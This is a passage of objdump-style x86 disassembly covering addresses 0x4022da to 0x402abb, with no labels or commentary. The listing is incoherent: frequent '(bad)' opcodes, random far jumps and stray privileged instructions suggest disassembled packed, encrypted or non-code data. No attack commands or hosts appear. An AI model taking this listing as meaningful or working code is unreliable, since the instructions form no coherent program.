  4022da:	or     DWORD PTR [ebx],ecx
  4022dc:	push   eax
  4022dd:	push   ecx
  4022de:	in     al,0x19
  4022e0:	nop    DWORD PTR [esi+0x5f]
  4022e4:	adc    eax,0x9014c040
  4022e9:	jmp    0xee72:0xa916ea3c
  4022f0:	mov    dh,0xf1
  4022f2:	sub    al,0xf5
  4022f4:	mov    ecx,esi
  4022f6:	inc    edi
  4022f7:	cs xchg ecx,eax
  4022f9:	push   ebp
  4022fa:	add    ch,BYTE PTR [edx-0x14c62bb8]
  402300:	cmp    dh,BYTE PTR [edx-0x1578a067]
  402306:	out    0x20,eax
  402308:	dec    edi
  402309:	sti    
  40230a:	mov    eax,0x4708ecbd
  40230f:	and    DWORD PTR [ebx+0x5e],0xc2aed47a
  402316:	xlat   BYTE PTR ds:[ebx]
  402317:	jl     0x40236d
  402319:	push   eax
  40231a:	(bad)  
  40231b:	jns    0x402358
  40231d:	sbb    DWORD PTR [eax-0x59],0xffffffe4
  402321:	push   0xe5de4ade
  402326:	dec    edi
  402327:	jmp    0x4cca46dc
  40232c:	cmp    bl,BYTE PTR [esi]
  40232e:	adc    eax,0xea3915fb
  402333:	test   eax,0x188023ac
  402338:	jno    0x40239e
  40233a:	sbb    DWORD PTR [ebx],edx
  40233c:	push   ebx
  40233d:	stos   BYTE PTR es:[edi],al
  40233e:	rcl    DWORD PTR [ecx+0x3c],0xd9
  402342:	xor    edx,DWORD PTR [ebp-0x225b9c8c]
  402348:	ins    BYTE PTR es:[edi],dx
  402349:	xchg   bl,ah
  40234b:	cmp    bh,BYTE PTR [eax-0xa0244d7]
  402351:	xchg   esp,eax
  402352:	add    ebp,DWORD PTR [eax-0x1d]
  402355:	adc    cl,BYTE PTR [edx]
  402357:	sbb    al,0x73
  402359:	repz mov ecx,DWORD PTR [ecx-0x5bbcd4e6]
  402360:	and    eax,0xd446a5ba
  402365:	mov    dl,BYTE PTR [esi-0x747802e2]
  40236b:	push   edx
  40236c:	jmp    0x716e:0xd7a1a7b7
  402373:	adc    DWORD PTR [ebx],0xbfcfe211
  402379:	(bad)  
  40237a:	ret    0xaa25
  40237d:	sbb    al,0x55
  40237f:	sub    esi,esp
  402381:	addr16 mov dl,0x34
  402384:	icebp  
  402385:	cwde   
  402386:	jg     0x40239b
  402388:	dec    ebx
  402389:	pushf  
  40238a:	push   es
  40238b:	sbb    dl,al
  40238d:	dec    ebx
  40238e:	loope  0x402401
  402390:	ret    0xcff7
  402393:	js     0x40237d
  402395:	push   cs
  402396:	cmp    esi,eax
  402398:	sub    ah,dh
  40239a:	push   esi
  40239b:	mov    DWORD PTR [eax-0x61b92332],ebp
  4023a1:	xchg   DWORD PTR [eax],ecx
  4023a3:	add    edx,DWORD PTR [esi+0x70e47a23]
  4023a9:	mov    ch,0xa4
  4023ab:	dec    ebx
  4023ac:	enter  0xd232,0x3
  4023b0:	mov    edx,0xaa577cf9
  4023b5:	dec    ecx
  4023b6:	(bad)  
  4023b7:	adc    edx,DWORD PTR [ebx+ebx*4]
  4023ba:	sub    al,0x73
  4023bc:	mov    edx,0x8806b0a0
  4023c1:	ffreep st(2)
  4023c3:	mov    cl,0xe3
  4023c5:	ror    DWORD PTR [edi],cl
  4023c7:	scas   al,BYTE PTR es:[edi]
  4023c8:	or     DWORD PTR [edi+0x36],edi
  4023cb:	pop    edx
  4023cc:	out    dx,eax
  4023cd:	push   edx
  4023ce:	jne    0x402435
  4023d0:	(bad)  
  4023d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023d2:	scas   al,BYTE PTR es:[edi]
  4023d3:	adc    eax,0x4ac42f93
  4023d8:	test   eax,0x3b7a2053
  4023dd:	call   0x53166fc5
  4023e2:	int    0xca
  4023e4:	pop    ds
  4023e5:	or     eax,0x2fccaaf4
  4023ea:	add    ebp,edi
  4023ec:	sbb    ah,BYTE PTR [ecx]
  4023ee:	cdq    
  4023ef:	add    al,BYTE PTR [ebp-0x19c6fc30]
  4023f5:	inc    edi
  4023f6:	add    DWORD PTR [edx+0x1290c1de],eax
  4023fc:	(bad)  
  4023fd:	aaa    
  4023fe:	sbb    BYTE PTR [ebx+0xc5ffa39],dh
  402404:	cmp    al,0xc2
  402406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402408:	push   edi
  402409:	(bad)  
  40240a:	out    dx,eax
  40240b:	and    ebp,DWORD PTR [ebp-0x1a9edf75]
  402411:	shl    BYTE PTR [edi-0x689749af],1
  402417:	leave  
  402418:	or     al,BYTE PTR [esi]
  40241a:	aas    
  40241b:	mov    ebp,0x74448488
  402420:	inc    ecx
  402421:	daa    
  402422:	sub    DWORD PTR ds:0x9389daf,ebp
  402428:	jae    0x40247c
  40242a:	cs mov edx,0x79a44a36
  402430:	mov    dx,0x945b
  402434:	inc    esi
  402435:	add    eax,0xbfe5125f
  40243a:	or     bl,BYTE PTR [ebx]
  40243c:	stos   DWORD PTR es:[edi],eax
  40243d:	push   ecx
  40243e:	aam    0xb3
  402440:	pop    es
  402441:	aaa    
  402442:	mov    edi,0x67cab38
  402447:	in     eax,0x25
  402449:	mov    ebx,0x5705d62a
  40244e:	xchg   edx,eax
  40244f:	mov    bl,0x79
  402451:	movzx  eax,WORD PTR [ebx-0x66]
  402455:	outs   dx,DWORD PTR ds:[esi]
  402456:	dec    edi
  402457:	int    0x51
  402459:	adc    DWORD PTR [esi+0x7c],ebx
  40245c:	pop    esi
  40245d:	pop    ebx
  40245e:	lea    eax,[esi+0x2e]
  402461:	mov    esi,0x919752dc
  402466:	xchg   esi,eax
  402467:	jmp    0x4a61:0xfa120188
  40246e:	and    al,0x1d
  402470:	mov    cl,0xa1
  402472:	pop    edi
  402473:	rcl    BYTE PTR [edi+0x77],1
  402476:	rcl    BYTE PTR [ebx],1
  402478:	arpl   WORD PTR [ecx+0x14],bp
  40247b:	loope  0x402483
  40247d:	cmc    
  40247e:	mov    eax,DWORD PTR [edx]
  402480:	loope  0x402486
  402482:	mov    dl,0x98
  402484:	out    0xd3,al
  402486:	jns    0x402439
  402488:	(bad)  
  402489:	xor    ch,ah
  40248b:	xchg   ebp,eax
  40248c:	test   eax,0x80d2550e
  402491:	push   esi
  402492:	fcmovnb st,st(0)
  402494:	or     al,0x92
  402496:	jecxz  0x402469
  402498:	jg     0x402428
  40249a:	push   esp
  40249b:	aad    0x27
  40249d:	addr16 xchg edx,eax
  40249f:	(bad)  
  4024a0:	ffree  st(1)
  4024a2:	leave  
  4024a3:	ins    DWORD PTR es:[edi],dx
  4024a4:	sub    eax,0xfa4723cc
  4024a9:	jnp    0x402488
  4024ab:	jmp    0x5848:0x533adfb9
  4024b2:	(bad)  
  4024b3:	cdq    
  4024b4:	pop    es
  4024b5:	cmp    DWORD PTR [esi],0xffffffde
  4024b8:	xchg   ebx,eax
  4024b9:	jnp    0x4024c0
  4024bb:	daa    
  4024bc:	mov    edx,ecx
  4024be:	push   ebx
  4024bf:	ficomp DWORD PTR [eax+0x29]
  4024c2:	outs   dx,DWORD PTR ds:[esi]
  4024c3:	mov    bh,0xb2
  4024c5:	mov    ebp,0xe2fa81ce
  4024ca:	sub    eax,0x4024007a
  4024cf:	fmul   DWORD PTR fs:[esi+ecx*8+0x5f]
  4024d4:	(bad)  
  4024d6:	mov    eax,0x2b6591f3
  4024db:	js     0x4024dd
  4024dd:	std    
  4024de:	in     al,dx
  4024df:	psubsb mm7,QWORD PTR [edi]
  4024e2:	add    al,0x42
  4024e4:	stos   DWORD PTR es:[edi],eax
  4024e5:	mov    eax,0x763128c8
  4024ea:	enter  0xd575,0xdc
  4024ee:	mov    esi,0xbe1b1a81
  4024f3:	daa    
  4024f4:	mov    ds,esi
  4024f6:	sbb    cl,BYTE PTR [esi+eax*4+0x35c2b129]
  4024fd:	jns    0x402557
  4024ff:	add    al,BYTE PTR gs:[edx+edi*8-0x35]
  402504:	stos   BYTE PTR es:[edi],al
  402505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402506:	(bad)  
  402507:	or     ebx,DWORD PTR [edx]
  402509:	fistp  QWORD PTR [ecx+0x20]
  40250c:	sub    eax,0x8dbdf349
  402511:	call   0x551257c1
  402516:	test   al,0x0
  402518:	jo     0x402509
  40251a:	out    0x8,al
  40251c:	inc    ebx
  40251d:	out    dx,eax
  40251e:	mov    BYTE PTR [ebx-0x2d],bl
  402521:	fstp   DWORD PTR [ebp+esi*4-0xcf28f1c]
  402528:	xor    DWORD PTR [ecx+0x352594c6],esp
  40252e:	push   esp
  40252f:	push   ss
  402530:	ins    DWORD PTR es:[edi],dx
  402531:	cmc    
  402532:	arpl   WORD PTR [eax],bp
  402534:	mov    ds:0x5aff240a,eax
  402539:	test   BYTE PTR [esi+ebp*1],bh
  40253c:	call   0x90:0x94697592
  402543:	xor    DWORD PTR [esi],0x1ede7321
  402549:	lea    ebp,[edx+0x6a]
  40254c:	jbe    0x40258a
  40254e:	xor    DWORD PTR fs:[ebx+ecx*2],edi
  402552:	jae    0x4025cc
  402554:	test   al,0xd2
  402556:	cmc    
  402557:	dec    ebp
  402558:	mov    ebx,0xbdd59fb0
  40255d:	xchg   ecx,eax
  40255e:	es cmc 
  402560:	movd   mm4,DWORD PTR ds:[ebx+edi*4]
  402565:	dec    ebx
  402566:	arpl   WORD PTR [ebx+0x5d],di
  402569:	aad    0x3c
  40256b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40256c:	dec    ebp
  40256d:	xchg   DWORD PTR [eax-0x7d],eax
  402570:	sub    ah,BYTE PTR [ecx]
  402572:	mov    dl,0x1e
  402574:	out    0x57,eax
  402576:	fstp   QWORD PTR [edi+0x7eb153ce]
  40257c:	cdq    
  40257d:	mov    dh,0x78
  40257f:	mov    ebp,0x3a5fe936
  402584:	add    BYTE PTR [edx-0x1eb23267],bh
  40258a:	jno    0x4025c9
  40258c:	push   eax
  40258d:	add    eax,0x52457f4e
  402592:	jnp    0x402589
  402594:	out    0x63,eax
  402596:	scas   al,BYTE PTR es:[edi]
  402597:	pop    es
  402598:	outs   dx,DWORD PTR ds:[esi]
  402599:	lahf   
  40259a:	mov    ch,0xc9
  40259c:	sub    eax,0xbffdc095
  4025a1:	imul   ebp,esi,0x8100e74d
  4025a7:	dec    esi
  4025a8:	push   ds
  4025a9:	adc    esi,DWORD PTR [ecx]
  4025ab:	cld    
  4025ac:	mov    WORD PTR [ebx+eiz*1],ds
  4025af:	cmp    al,cl
  4025b1:	popf   
  4025b2:	jecxz  0x402590
  4025b4:	fsub   DWORD PTR [edi+0x35]
  4025b7:	ret    0xc1fa
  4025ba:	xchg   ebx,eax
  4025bb:	ds jmp 0xfe9f518c
  4025c1:	test   eax,0x43ee9ca7
  4025c6:	(bad)  
  4025c7:	imul   ecx,DWORD PTR [eax+0x4231e28e],0x3a
  4025ce:	jbe    0x4025f3
  4025d0:	inc    ebx
  4025d1:	add    BYTE PTR [edi+ebx*8+0x77],0x1f
  4025d6:	idiv   BYTE PTR [esi]
  4025d8:	stc    
  4025d9:	and    al,0xb4
  4025db:	cmc    
  4025dc:	jmp    0x4025f2
  4025de:	sar    dh,1
  4025e0:	enter  0x83bc,0x24
  4025e4:	pusha  
  4025e5:	dec    esp
  4025e6:	addr16 pop esp
  4025e8:	jge    0x40258c
  4025ea:	icebp  
  4025eb:	push   ss
  4025ec:	push   cs
  4025ed:	dec    esi
  4025ee:	adc    al,0xd6
  4025f0:	call   0x165d:0x72f2e5ef
  4025f7:	jp     0x402600
  4025f9:	std    
  4025fa:	and    al,0xce
  4025fc:	xor    edx,ebp
  4025fe:	mov    dl,0xa4
  402600:	das    
  402601:	pmulhw mm0,QWORD PTR [edi-0x49]
  402605:	push   edi
  402606:	inc    esp
  402607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402608:	sbb    esi,DWORD PTR [ebp+esi*4+0x33722b25]
  40260f:	mov    WORD PTR [edx],ss
  402611:	xchg   ebx,eax
  402612:	es pop edx
  402614:	pop    edx
  402615:	push   ds
  402616:	xchg   ecx,ebx
  402618:	fidivr DWORD PTR [esi-0x21]
  40261b:	repz cwde 
  40261d:	ins    BYTE PTR es:[edi],dx
  40261e:	test   al,0xa9
  402620:	stc    
  402621:	into   
  402622:	jbe    0x4025df
  402624:	int    0x2c
  402626:	cmp    al,0x6f
  402628:	xchg   ebp,eax
  402629:	mov    ah,0x10
  40262b:	mov    al,0x1d
  40262d:	adc    eax,0xb1f237e6
  402632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402633:	enter  0xe495,0xf2
  402637:	dec    edx
  402639:	xchg   ebx,eax
  40263a:	rol    DWORD PTR [esi+0x1e3568a9],0x57
  402641:	ror    BYTE PTR [edx+edi*1],1
  402644:	dec    BYTE PTR [ecx+0x39648e3a]
  40264a:	jg     0xe4ac34ee
  402650:	push   ds
  402651:	lahf   
  402652:	popf   
  402653:	jnp    0x4026c9
  402655:	adc    eax,0x715504e3
  40265a:	imul   ebp,DWORD PTR fs:[edx+0x5b],0xffffffaa
  40265f:	pop    ecx
  402660:	adc    DWORD PTR [edx-0x2d],ebx
  402663:	fiadd  DWORD PTR [ecx-0x7]
  402666:	fstp   QWORD PTR [edi+0x4cfe3cb3]
  40266c:	push   cs
  40266d:	sub    ch,BYTE PTR [eax+0x2a5005d2]
  402673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402674:	in     al,0xfd
  402676:	jmp    0x53ad0329
  40267b:	clc    
  40267c:	mov    ch,0xf0
  40267e:	rcl    BYTE PTR [edi-0xa],1
  402681:	inc    esi
  402682:	inc    edx
  402683:	pop    ebx
  402684:	pop    es
  402685:	call   0xd4d713e2
  40268a:	fbld   TBYTE PTR ds:0x4cf8910c
  402690:	(bad)  
  402691:	ficomp DWORD PTR [esi]
  402693:	mov    cl,0x4f
  402695:	mov    dl,0x31
  402697:	int    0xa8
  402699:	xor    esp,DWORD PTR [ecx-0x28]
  40269c:	mov    al,ds:0xca8fff63
  4026a1:	dec    eax
  4026a2:	xchg   esi,eax
  4026a3:	push   esi
  4026a4:	jne    0x402701
  4026a6:	stos   DWORD PTR es:[edi],eax
  4026a7:	(bad)  
  4026a9:	mov    ds:0x1b0beade,eax
  4026ae:	or     esp,eax
  4026b0:	jmp    0xbdee5f7d
  4026b5:	into   
  4026b6:	and    BYTE PTR [eax+0x573def7c],dh
  4026bc:	test   al,0xeb
  4026be:	sub    edi,DWORD PTR [ebp+0x51]
  4026c1:	add    ebx,DWORD PTR [esi-0x2b1b0d17]
  4026c7:	fnstcw WORD PTR [esi+0x112f4eaa]
  4026cd:	jle    0x402698
  4026cf:	jbe    0x402675
  4026d1:	iret   
  4026d2:	mov    edi,0x771fb6a1
  4026d7:	fdivr  QWORD PTR [ebx+eax*2]
  4026da:	mov    esi,0xb2bbea27
  4026df:	test   BYTE PTR [ebx+0x60],bh
  4026e2:	pushf  
  4026e3:	ja     0x4026e4
  4026e5:	push   edi
  4026e6:	dec    esi
  4026e7:	push   esp
  4026e8:	ds sti 
  4026ea:	cwde   
  4026eb:	jns    0x402733
  4026ed:	ror    edx,0x54
  4026f0:	xor    ah,dl
  4026f2:	bound  ecx,QWORD PTR [esp-0x54]
  4026f6:	add    al,0xb1
  4026f8:	and    edx,DWORD PTR [eax]
  4026fa:	fisttp DWORD PTR [ecx+0x731b9617]
  402700:	sbb    BYTE PTR [ebp+0x466cfb51],ah
  402706:	repnz icebp 
  402708:	(bad)  [edx+0x3a4ac310]
  40270e:	stos   BYTE PTR es:[edi],al
  40270f:	nop
  402710:	scas   eax,DWORD PTR es:[edi]
  402711:	adc    bh,ch
  402713:	out    dx,eax
  402714:	mov    bl,0xe6
  402716:	jmp    0x4026fa
  402718:	sbb    BYTE PTR [esi+ecx*2+0x15],dh
  40271c:	mov    ah,0xf5
  40271e:	dec    ax
  402720:	sahf   
  402721:	adc    BYTE PTR [eax-0x6db24de6],ch
  402727:	fs inc esp
  402729:	xor    eax,0x12de8cf8
  40272e:	and    BYTE PTR [ebp+0x17705409],dh
  402734:	xchg   edi,ebp
  402736:	mov    WORD PTR [ebx-0xa],cs
  402739:	sub    ch,BYTE PTR [ebp+0x8856d8]
  40273f:	ins    BYTE PTR es:[edi],dx
  402740:	xchg   DWORD PTR [ecx+0x475d3f21],esi
  402746:	sbb    BYTE PTR [esi],dl
  402748:	int    0xc4
  40274a:	inc    ebx
  40274b:	test   BYTE PTR [esi-0x5c],0x34
  40274f:	je     0x4027a1
  402751:	shl    BYTE PTR [edx],cl
  402753:	or     eax,0x747f7d10
  402758:	mov    edx,0x57d9b683
  40275d:	ret    
  40275e:	clc    
  40275f:	push   ecx
  402760:	frstor [edi+0x5]
  402763:	fldcw  WORD PTR [ecx+0x72]
  402766:	rol    DWORD PTR [eax],1
  402768:	enter  0xc8ea,0x5a
  40276c:	(bad)  
  40276e:	stos   BYTE PTR es:[edi],al
  40276f:	adc    ch,ch
  402771:	push   ecx
  402772:	fnstsw WORD PTR [edx-0x7e]
  402775:	aam    0x63
  402777:	xor    BYTE PTR [ecx-0x13],cl
  40277a:	pop    ebx
  40277b:	lods   al,BYTE PTR ds:[esi]
  40277c:	sub    eax,0x82fd3e77
  402781:	rol    DWORD PTR [edi+0x14],cl
  402784:	dec    ebp
  402785:	inc    esi
  402786:	out    0x35,al
  402788:	dec    edx
  402789:	and    eax,0x2ed58e62
  40278e:	and    DWORD PTR [ebx],ecx
  402790:	cmp    eax,0xa3fdce75
  402795:	into   
  402796:	sub    al,0xe
  402798:	adc    esp,ebx
  40279a:	test   al,0x26
  40279c:	xor    al,0x78
  40279e:	call   0x323c:0xa3ac4365
  4027a5:	jecxz  0x4027c6
  4027a7:	xor    eax,0x569bdc9
  4027ac:	test   DWORD PTR [edx],edi
  4027ae:	lds    edi,FWORD PTR [eax-0x28fb629c]
  4027b4:	fdivr  st,st(2)
  4027b6:	jecxz  0x4027d7
  4027b8:	pop    esi
  4027b9:	imul   edx,eax,0x2fa60d76
  4027bf:	mov    al,0xda
  4027c1:	dec    esi
  4027c2:	mov    dl,0x2a
  4027c4:	mov    WORD PTR [ecx],?
  4027c6:	cmp    ah,ch
  4027c8:	fldenv [edx+eiz*8+0x3a]
  4027cc:	loope  0x40283e
  4027ce:	add    eax,0xc8426181
  4027d3:	ins    BYTE PTR es:[edi],dx
  4027d4:	dec    edi
  4027d5:	sbb    ecx,0x83cc10df
  4027db:	ret    
  4027dc:	add    BYTE PTR [ecx+0xc],al
  4027df:	jg     0x4027d5
  4027e1:	xor    esp,DWORD PTR [eax+0x42]
  4027e4:	jle    0x402835
  4027e6:	pushf  
  4027e7:	mov    dh,BYTE PTR [ebx]
  4027e9:	sahf   
  4027ea:	push   edi
  4027eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027ec:	jmp    0x40281f
  4027ee:	sbb    eax,0x60613ac6
  4027f3:	add    eax,0x6caa5e02
  4027f8:	outs   dx,BYTE PTR ds:[esi]
  4027f9:	xor    BYTE PTR [ebx-0x5a8c91ef],bl
  4027ff:	xor    al,al
  402801:	and    BYTE PTR [edx+0x2b277dcb],cl
  402807:	jno    0x4027fa
  402809:	lods   al,BYTE PTR ds:[esi]
  40280a:	mov    bh,BYTE PTR [esi-0x1720e388]
  402810:	(bad)  
  402811:	dec    edi
  402812:	retf   
  402813:	imul   edi,DWORD PTR [edi],0xffffffa7
  402816:	pop    ss
  402817:	(bad)  
  402819:	xor    al,0x84
  40281b:	xor    al,0xd6
  40281d:	ins    BYTE PTR es:[edi],dx
  40281e:	ret    
  40281f:	bnd jp 0x4027b9
  402822:	aam    0x8c
  402824:	pop    ebp
  402825:	push   esp
  402826:	add    eax,0x4a4feaec
  40282b:	xchg   ebp,eax
  40282c:	into   
  40282d:	fbld   TBYTE PTR [eax-0x5f]
  402830:	hlt    
  402831:	scas   eax,DWORD PTR es:[edi]
  402832:	arpl   WORD PTR [ecx+ebp*2-0x1521fbe8],bp
  402839:	retf   0x1798
  40283c:	pop    ds
  40283d:	shr    BYTE PTR [esi+0x66],cl
  402840:	pop    ebp
  402841:	sbb    eax,0x5f4cc302
  402846:	sbb    eax,0xe896807a
  40284b:	xchg   ecx,eax
  40284c:	dec    ebp
  40284d:	mov    bh,0x13
  40284f:	mul    DWORD PTR [esi-0x5774ed6e]
  402855:	nop
  402856:	jmp    0x4028c8
  402858:	sbb    eax,0x5bc2ccc0
  40285d:	xor    al,0x5c
  40285f:	inc    ebx
  402860:	cmp    bh,BYTE PTR [eax+0x5e]
  402863:	dec    eax
  402864:	(bad)  
  402865:	push   eax
  402866:	inc    edi
  402867:	push   ebx
  402868:	pusha  
  402869:	jbe    0x402803
  40286b:	cs rol DWORD PTR fs:[esi+0xda31d08],1
  402873:	daa    
  402874:	sti    
  402875:	cmp    bl,BYTE PTR [ebx]
  402877:	mov    al,0x31
  402879:	xlat   BYTE PTR ds:[ebx]
  40287a:	fs mov ebp,0xed0e5017
  402880:	loope  0x4028cb
  402882:	or     al,0xbb
  402884:	enter  0xdbe2,0x3b
  402888:	and    BYTE PTR [ebp+0x33],al
  40288b:	or     eax,0xd67a1960
  402890:	and    eax,0x854fd3d5
  402895:	popa   
  402896:	loope  0x402870
  402898:	dec    edx
  402899:	dec    edi
  40289a:	sahf   
  40289b:	call   0xce0c:0x4b7fc2b
  4028a2:	xchg   ebp,eax
  4028a3:	pop    edx
  4028a4:	retf   
  4028a5:	fdivr  QWORD PTR [esp+eax*4-0x3935b0ea]
  4028ac:	mov    bl,bl
  4028ae:	cli    
  4028af:	push   ds
  4028b0:	adc    ch,bl
  4028b2:	out    dx,eax
  4028b3:	mov    bh,0xec
  4028b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028b6:	mov    ecx,0x32bf3d9d
  4028bb:	ret    
  4028bc:	inc    esp
  4028bd:	push   edx
  4028be:	inc    edx
  4028bf:	aad    0x7f
  4028c1:	lock xchg edx,eax
  4028c3:	bound  ecx,QWORD PTR [eax+0x119413ee]
  4028c9:	pop    ds
  4028ca:	xchg   BYTE PTR [edi],ch
  4028cc:	in     eax,dx
  4028cd:	aaa    
  4028ce:	aad    0xdc
  4028d0:	rcl    DWORD PTR [ecx],cl
  4028d2:	mov    ds:0xbab382e2,al
  4028d7:	ins    BYTE PTR es:[edi],dx
  4028d8:	lods   al,BYTE PTR ds:[esi]
  4028d9:	mov    ch,0x86
  4028db:	mov    al,ds:0x5afc0516
  4028e0:	mov    DWORD PTR [eax],eax
  4028e2:	(bad)  
  4028e3:	push   0x37169911
  4028e8:	jmp    0xf74af47d
  4028ed:	mov    BYTE PTR [ecx-0x1108c28c],ah
  4028f3:	dec    ecx
  4028f4:	out    dx,eax
  4028f5:	repnz xchg esi,eax
  4028f7:	pop    edx
  4028f8:	je     0x4028fb
  4028fa:	push   eax
  4028fb:	inc    ebp
  4028fc:	sub    eax,0xf6e8952
  402901:	xchg   cl,al
  402903:	mov    ecx,0x576caf68
  402908:	fsub   DWORD PTR [esp+edx*1+0x40]
  40290c:	mov    BYTE PTR [edi],0x99
  40290f:	out    0x35,al
  402911:	inc    edx
  402912:	pop    edi
  402913:	in     eax,0x86
  402915:	dec    edx
  402916:	add    dl,BYTE PTR [edi+0x46a2f8fe]
  40291c:	sub    al,BYTE PTR [ebx+0x3832b14e]
  402922:	imul   edx,DWORD PTR [esi+0x4b],0xb
  402926:	rcl    eax,cl
  402928:	adc    bh,ah
  40292a:	inc    esi
  40292b:	xchg   esp,eax
  40292c:	inc    eax
  40292d:	inc    ebp
  40292e:	jnp    0x402944
  402930:	shl    DWORD PTR [edi],1
  402932:	pop    edx
  402933:	call   0x4106:0xb3f6d2f2
  40293a:	dec    esp
  40293b:	(bad)  
  40293c:	pop    ecx
  40293d:	test   DWORD PTR [edx-0x63],ebx
  402940:	mov    dh,0xf4
  402942:	xor    dh,bl
  402944:	nop
  402945:	fdivr  DWORD PTR [esi+0x20]
  402948:	xchg   ebx,eax
  402949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40294a:	test   eax,0x3c3a6f46
  40294f:	push   es
  402950:	ins    BYTE PTR es:[edi],dx
  402951:	xor    edx,DWORD PTR [eax-0x17a03d84]
  402957:	dec    esp
  402958:	or     al,0xaa
  40295a:	das    
  40295b:	cmp    ebp,DWORD PTR [edi+0x5e5bee5d]
  402961:	sbb    BYTE PTR [edx],ch
  402963:	cmp    edi,ebp
  402965:	pop    ss
  402966:	fidiv  WORD PTR [edx-0x69]
  402969:	ins    DWORD PTR es:[edi],dx
  40296a:	pop    ds
  40296b:	pushf  
  40296c:	cmc    
  40296d:	or     DWORD PTR ds:0x7db71c2a,0x977bbf33
  402977:	pushf  
  402978:	lock fcom QWORD PTR [ecx+ebp*1-0x5218aea]
  402980:	loopne 0x40297a
  402982:	sub    BYTE PTR [edi+0x11],bh
  402985:	ja     0x4029c1
  402987:	enter  0xe871,0x8f
  40298b:	cld    
  40298c:	mov    ds:0xeea9ec7c,al
  402991:	adc    bh,dh
  402993:	pusha  
  402994:	cmp    eax,0x3d538311
  402999:	jb     0x4029c0
  40299b:	(bad)  
  40299c:	into   
  40299d:	das    
  40299e:	jo     0x402a11
  4029a0:	imul   ebx,DWORD PTR [edi],0xbf8517f0
  4029a6:	inc    esi
  4029a7:	lahf   
  4029a8:	adc    esi,esi
  4029aa:	mov    BYTE PTR ds:0x9e47ad89,ch
  4029b0:	adc    bl,bl
  4029b2:	out    0x47,eax
  4029b4:	lock and al,0xeb
  4029b7:	push   0x9d44ed9e
  4029bc:	retf   0x902d
  4029bf:	aam    0xef
  4029c1:	sub    DWORD PTR [edx-0x7cf8cf1c],ebp
  4029c7:	push   edx
  4029c8:	fidiv  WORD PTR [esi+0x13]
  4029cb:	clc    
  4029cc:	pop    edx
  4029cd:	cmp    al,0x3b
  4029cf:	into   
  4029d0:	aas    
  4029d1:	adc    BYTE PTR [ecx-0x78],ch
  4029d4:	imul   edx,DWORD PTR [eax-0x4c8e3326],0x7d
  4029db:	test   al,0x62
  4029dd:	pop    ecx
  4029de:	ja     0x402995
  4029e0:	cmc    
  4029e1:	xchg   esi,eax
  4029e2:	mov    esi,0x60b7f906
  4029e7:	in     eax,0x13
  4029e9:	ds mov ebx,0xf660fa5
  4029f0:	(bad)  
  4029f1:	cmp    eax,0x6ff33bdb
  4029f6:	dec    esp
  4029f7:	inc    edx
  4029f8:	(bad)  
  4029f9:	test   eax,0x9f50da45
  4029fe:	int    0x9f
  402a00:	rep ins BYTE PTR es:[edi],dx
  402a02:	xor    BYTE PTR [esi+0x15],ch
  402a05:	sub    eax,0xcfb47889
  402a0a:	xchg   ebp,eax
  402a0b:	jecxz  0x402a28
  402a0d:	xchg   DWORD PTR [ebp*4-0x26786b61],edx
  402a14:	pavgb  mm5,QWORD PTR es:[ecx+ebp*8]
  402a19:	fsub   QWORD PTR [esi]
  402a1b:	cli    
  402a1c:	cmps   DWORD PTR ss:[si],DWORD PTR es:[di]
  402a1f:	dec    ebp
  402a20:	sub    DWORD PTR [ecx-0x5dad3cda],0x9a176804
  402a2a:	loopne 0x402a86
  402a2c:	scas   al,BYTE PTR es:[edi]
  402a2d:	mov    DWORD PTR ds:0xe8ceefec,eax
  402a33:	lods   al,BYTE PTR ds:[esi]
  402a34:	xor    al,0x64
  402a36:	scas   al,BYTE PTR es:[edi]
  402a37:	pop    edi
  402a38:	dec    ebp
  402a39:	sub    DWORD PTR [edi+0x384f22eb],edi
  402a3f:	push   esp
  402a40:	pop    ebp
  402a41:	pushf  
  402a42:	leave  
  402a43:	call   0xeaf7:0x983d6003
  402a4a:	mov    ah,0xbf
  402a4c:	xchg   ecx,eax
  402a4d:	outs   dx,BYTE PTR ds:[esi]
  402a4e:	(bad)  
  402a4f:	in     eax,0x4f
  402a51:	repnz xlat BYTE PTR ds:[ebx]
  402a53:	imul   eax,ecx,0xffffff90
  402a56:	jns    0x402a8a
  402a58:	ins    DWORD PTR es:[edi],dx
  402a59:	cmp    eax,0xb9aad168
  402a5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a5f:	jmp    0x402a4e
  402a61:	scas   eax,DWORD PTR es:[edi]
  402a62:	inc    esi
  402a63:	push   ebp
  402a64:	test   DWORD PTR [ecx-0x37],0x831a8fe1
  402a6b:	push   ss
  402a6c:	add    dh,al
  402a6e:	sbb    dh,BYTE PTR [ebx]
  402a70:	mov    ebp,0xe593c540
  402a75:	inc    edx
  402a76:	inc    ecx
  402a77:	pop    esp
  402a78:	mov    esp,0xf6a3e49c
  402a7d:	sbb    cl,bh
  402a7f:	push   ss
  402a80:	fwait
  402a81:	scas   eax,DWORD PTR es:[edi]
  402a82:	and    edx,DWORD PTR [edi]
  402a84:	xchg   ebx,eax
  402a85:	into   
  402a86:	repnz cmp ah,BYTE PTR cs:[esi+0x4d]
  402a8b:	xchg   edx,eax
  402a8c:	jp     0x402a7b
  402a8e:	cmp    BYTE PTR [eax-0x66],cl
  402a91:	pop    ebx
  402a92:	aad    0x1c
  402a94:	pop    ebx
  402a95:	test   dl,0x7d
  402a98:	and    ebx,DWORD PTR [eax-0x5a]
  402a9b:	ins    BYTE PTR es:[edi],dx
  402a9c:	push   esi
  402a9d:	dec    BYTE PTR [ecx+0x5cd2d67d]
  402aa3:	pop    ss
  402aa4:	loope  0x402a82
  402aa6:	test   al,0x46
  402aa8:	arpl   WORD PTR [ebx+0x6fa037ff],dx
  402aae:	dec    ecx
  402aaf:	into   
  402ab0:	and    ah,BYTE PTR ds:0x20e805d7
  402ab6:	cmp    DWORD PTR [edx+0x58],esp
  402ab9:	scas   eax,DWORD PTR es:[edi]
  402aba:	das    
  402abb:	lods   al,BYTE PTR ds:[esi]
